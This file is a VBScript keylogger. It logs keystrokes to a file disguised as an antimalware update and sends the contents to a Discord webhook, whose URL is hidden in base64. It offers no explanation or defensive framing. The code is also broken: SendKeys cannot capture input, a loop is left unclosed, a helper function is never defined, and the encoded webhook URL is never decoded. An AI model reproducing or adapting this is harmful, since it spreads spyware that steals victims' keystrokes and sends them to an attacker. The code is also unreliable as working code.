Function Base64Decode(ByVal vCode)
    Dim oXML, oNode

    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile("C:\lenziAntiMalware\2023\lenziINC\updates.lse", True)

Const VK_RETURN = &HD
Const VK_BACK = &H8
Const VK_SHIFT = &H10

While True
    For i = 1 to 255
        If objShell.SendKeys("{ASC " & i & "}") Then
            If i = VK_RETURN Then
                objFile.WriteLine("[ENTER]")
            ElseIf i = VK_BACK Then
                objFile.WriteLine("[BACKSPACE]")
            ElseIf i = VK_SHIFT Then
                objFile.WriteLine("[SHIFT]")
            Else
                objFile.WriteLine(Chr(i))
            End If
        End If
    Next

Dim HttpReq, Message, WebhookURL
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile("C:\lenziAntiMalware\2023\lenziINC\updates.lse")
tu = file.ReadAll
Message = tu
Dim encodedText, decodedText
encodedText = "SGVsbG8gV29ybGQ="
decodedText = Base64Decode(encodedText)
l8 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA4MDgxMjU0NzcyNjM4MTA2Ni9JczY5UC1ZWkhVV1N3a2QyalRKR2YzS3VXZU9jYU0wN2xaejVfeFI0OVN4S1pFS0w2UmRoRDJqN19ZSm4wNlk2UmRqag=="
WebhookURL = l8

Set HttpReq = CreateObject("MSXML2.XMLHTTP")

HttpReq.Open "POST", WebhookURL, False
HttpReq.SetRequestHeader "Content-Type", "application/json"

Dim Payload
Payload = "{""content"": """ & Message & """}"

HttpReq.Send Payload
